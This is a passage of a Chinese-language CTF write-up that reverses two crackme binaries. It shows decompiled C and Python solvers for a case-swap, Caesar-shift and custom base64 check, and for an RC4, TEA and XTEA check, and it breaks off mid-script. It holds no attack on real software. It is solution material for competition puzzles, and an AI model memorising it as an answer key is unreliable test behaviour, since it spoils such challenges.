class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  sub_40DA40();</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ppap&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The cat is very cute, do you like it?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;My cat is lost, help me&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your cat&#x27;s name&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me 1+2=?&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%256s\n&quot;</span>, Str);                        <span class="comment">//输入字符串</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  v11 = (<span class="type">const</span> <span class="type">char</span> *)sub_401500(Str, v3);      <span class="comment">//v11 = 输入字符串的base64编码（自定义码表）</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">strlen</span>(v11) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7[i] = v11[i];                             <span class="comment">//v7 = v11</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&quot;</span>);</span><br><span class="line">                                                <span class="comment">//v8 = WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc</span></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  sub_40167D(v7);                               <span class="comment">//对v7做第一次处理，函数sub_40167D()</span></span><br><span class="line">  sub_401746(v7);                               <span class="comment">//对v7做第二次处理，函数sub_401746()</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = j;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="built_in">strlen</span>(v7) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7[j] != v8[j] )                       <span class="comment">//比较v7 == v8？</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ppap&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yes, you are right&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40167D()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">sub_40167D</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">96</span> || Str[i] &gt; <span class="number">122</span> )</span><br><span class="line">        Str[i] = Str[i];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        Str[i] -= <span class="number">32</span>;                         <span class="comment">//96&lt;字符ascii值&lt;=122，字符移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] += <span class="number">32</span>;                           <span class="comment">//64&lt;字符ascii值&lt;=90，字符移位</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_401746()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">sub_401746</span><span class="params">(<span class="type">char</span> *Str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[i] &gt; <span class="number">96</span> &amp;&amp; Str[i] &lt;= <span class="number">122</span> )</span><br><span class="line">        Str[i] = (Str[i] - <span class="number">97</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>;     <span class="comment">//96&lt;字符ascii值&lt;=122，字符循环移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] = (Str[i] - <span class="number">65</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>;       <span class="comment">//64&lt;字符ascii值&lt;=90，字符循环移位</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>v8</code> 字符串先按函数 <code>sub_401746()</code>还原，再按函数 <code>sub_40167D()</code>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&#x27;</span></span><br><span class="line">s=<span class="built_in">list</span>(s.encode())</span><br><span class="line"></span><br><span class="line">t=[-<span class="number">1</span>]*<span class="built_in">len</span>(s)</span><br><span class="line">tt=[-<span class="number">1</span>]*<span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">		c=j</span><br><span class="line">		<span class="keyword">if</span> c&lt;=<span class="number">64</span> <span class="keyword">or</span> c&gt;<span class="number">90</span>:</span><br><span class="line">			<span class="keyword">if</span> c&gt;<span class="number">96</span> <span class="keyword">and</span> c&lt;=<span class="number">122</span>:</span><br><span class="line">				c=(c-<span class="number">97</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			c=(c-<span class="number">65</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line">		<span class="keyword">if</span> c==s[i]:</span><br><span class="line">			t[i]=j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">		c=j</span><br><span class="line">		<span class="keyword">if</span> c&lt;=<span class="number">64</span> <span class="keyword">or</span> c&gt;<span class="number">90</span>:</span><br><span class="line">			<span class="keyword">if</span> c&lt;=<span class="number">96</span> <span class="keyword">or</span> c&gt;<span class="number">122</span>:</span><br><span class="line">				c=c</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				c-=<span class="number">32</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			c+=<span class="number">32</span></span><br><span class="line">		<span class="keyword">if</span> c==t[i]:</span><br><span class="line">			tt[i]=j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(tt))</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密得密文：tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ</span></span><br><span class="line"><span class="comment">#自定义码表：a-z0-9A-Z+/=</span></span><br></pre></td></tr></table></figure><p>解自定义码表下的base64得flag。</p><p>​</p><h3 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h3><blockquote><p>Do you like basketball?</p></blockquote><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">sub_40E3F0();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Do you like basketball?&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Source);                                            <span class="comment">//输入字符串Source</span></span><br><span class="line"><span class="built_in">strcpy</span>(Destination, Source);                                    <span class="comment">//Dest = Source</span></span><br><span class="line"><span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line"><span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">sub_40235D(Source, v7, <span class="string">&quot;flag&#123;Would_you_like_basketball?&#125;&quot;</span>);     <span class="comment">//函数sub_40235D(Source,out,key) （RC4+base64）</span></span><br><span class="line">v28 = <span class="number">32</span>;</span><br><span class="line">v24[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">v24[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">v24[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">v24[<span class="number">3</span>] = <span class="number">4</span>;                                                     <span class="comment">//v24 = [2,2,3,4]</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;please input your lucky number&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v25 + i);                                        <span class="comment">//输入v25,v26</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v22 + j);                                        <span class="comment">//输入v22,v23</span></span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">1</span>; ++k )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v20 + k);                                        <span class="comment">//输入v20,v21</span></span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">1</span>; ++l )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v18 + l);                                        <span class="comment">//输入v18,v19</span></span><br><span class="line">v4[<span class="number">0</span>] = v25;</span><br><span class="line">v4[<span class="number">1</span>] = v26;</span><br><span class="line">v4[<span class="number">2</span>] = v22;</span><br><span class="line">v4[<span class="number">3</span>] = v23;</span><br><span class="line">v4[<span class="number">4</span>] = v20;</span><br><span class="line">v4[<span class="number">5</span>] = v21;</span><br><span class="line">v4[<span class="number">6</span>] = v18;</span><br><span class="line">v4[<span class="number">7</span>] = v19;                                                    <span class="comment">//v4 = [v25,v26,v22,v23,v20,v21,v18,v19]</span></span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )                                      <span class="comment">//对v4冒泡排序（升序）</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">7</span>; n &gt; m; --n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[n] &lt; v4[n - <span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v27 = v4[n];</span><br><span class="line">      v4[n] = v4[n - <span class="number">1</span>];</span><br><span class="line">      v4[n - <span class="number">1</span>] = v27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">sub_40152F(&amp;v25, v24);                                          <span class="comment">//函数sub_40152F() （TEA加密）</span></span><br><span class="line">sub_40152F(&amp;v22, v24);                                          <span class="comment">//函数sub_40152F() （TEA加密）</span></span><br><span class="line">sub_4015FD(v28, &amp;v20, v24);                                     <span class="comment">//函数sub_4015FD() （XTEA加密）</span></span><br><span class="line">sub_4015FD(v28, &amp;v18, v24);                                     <span class="comment">//函数sub_4015FD() （XTEA加密）</span></span><br><span class="line"><span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">v9[<span class="number">0</span>] = <span class="number">81</span>;                                                     <span class="comment">//v9</span></span><br><span class="line">v9[<span class="number">1</span>] = <span class="number">116</span>;</span><br><span class="line">......</span><br><span class="line">v9[<span class="number">46</span>] = <span class="number">7</span>;</span><br><span class="line">v9[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">v16 = <span class="number">-1621115832</span>;                                              <span class="comment">//v10~v17，8个hex</span></span><br><span class="line">v17 = <span class="number">-984516975</span>;</span><br><span class="line">v14 = <span class="number">616429839</span>;</span><br><span class="line">v15 = <span class="number">807110888</span>;</span><br><span class="line">v12 = <span class="number">-1837822886</span>;</span><br><span class="line">v13 = <span class="number">-1596355058</span>;</span><br><span class="line">v10 = <span class="number">-1915738221</span>;</span><br><span class="line">v11 = <span class="number">1331005540</span>;</span><br><span class="line"><span class="keyword">if</span> ( v25 != <span class="number">-1621115832</span>                                         <span class="comment">//v25,v26,v22,v23,v20,v21,v18,v19 == v10~v17</span></span><br><span class="line">  || v26 != v17</span><br><span class="line">  || v14 != v22</span><br><span class="line">  || v15 != v23</span><br><span class="line">  || v12 != v20</span><br><span class="line">  || v13 != v21</span><br><span class="line">  || v10 != v18</span><br><span class="line">  || v11 != v19 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">47</span>; ++ii )</span><br><span class="line">  *(_DWORD *)&amp;v8[<span class="number">4</span> * ii + <span class="number">128</span>] = v4[ii % <span class="number">8</span>] ^ v7[ii];          <span class="comment">//v8 = v4^v7 </span></span><br><span class="line"><span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">47</span>; ++jj )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v9[jj] != *(_DWORD *)&amp;v8[<span class="number">4</span> * jj + <span class="number">128</span>] )                <span class="comment">//v9 == v8？</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Right,FLAG is Neepu&#123;%s&#125;\n&quot;</span>, Destination);</span><br><span class="line">system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40235D(Source,out,key)</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_40235D</span><span class="params">(<span class="type">char</span> *Str, <span class="type">void</span> *a2, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *Src; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> Size; <span class="comment">// [esp+20h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *Block; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Str &amp;&amp; a2 &amp;&amp; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    v6 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">    Block = (<span class="type">void</span> *)sub_418710(v7 + <span class="number">1</span>);                <span class="comment">//初始化Block</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Block, Str, v7 + <span class="number">1</span>);</span><br><span class="line">    sub_401E22(Block, v7, a3, v6);                     <span class="comment">//RC4加密，Block = RC4(Str,key)</span></span><br><span class="line">    Size = <span class="number">0</span>;</span><br><span class="line">    Src = <span class="number">0</span>;</span><br><span class="line">    sub_4020DE(Block, v7, (<span class="type">int</span>)&amp;Src, (<span class="type">int</span>)&amp;Size);      <span class="comment">//Src = Block的base64编码（自定义码表）</span></span><br><span class="line">    <span class="keyword">if</span> ( Src )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(a2, Src, Size);                           <span class="comment">//a2 = Src</span></span><br><span class="line">      *((_BYTE *)a2 + Size) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( Src )</span><br><span class="line">        j_j_free(Src);</span><br><span class="line">      Src = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( Block )</span><br><span class="line">      j_j_free(Block);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40152F()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_40152F</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, _DWORD *a2)</span>        <span class="comment">//TEA加密算法</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 -= <span class="number">1640531527</span>;</span><br><span class="line">    v6 += (v5 + v4) ^ (<span class="number">16</span> * v5 + *a2) ^ ((v5 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]);</span><br><span class="line">    v5 += (v6 + v4) ^ (<span class="number">16</span> * v6 + a2[<span class="number">2</span>]) ^ ((v6 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_4015FD()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_4015FD</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> *a2, <span class="type">int</span> a3)</span>        <span class="comment">//XTEA算法</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a2;</span><br><span class="line">  v5 = a2[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (*(_DWORD *)(<span class="number">4</span> * (v4 &amp; <span class="number">3</span>) + a3) + v4);</span><br><span class="line">    v4 -= <span class="number">1640531527</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (*(_DWORD *)(<span class="number">4</span> * ((v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>) + a3) + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a2[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面逻辑，先利用TEA和XTEA解密算法由 <code>v10~v17</code> 解密得到初始值 <code>v25,v26,v22,v23,v20,v21,v18,v19</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TEA解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xC6EF3720</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == 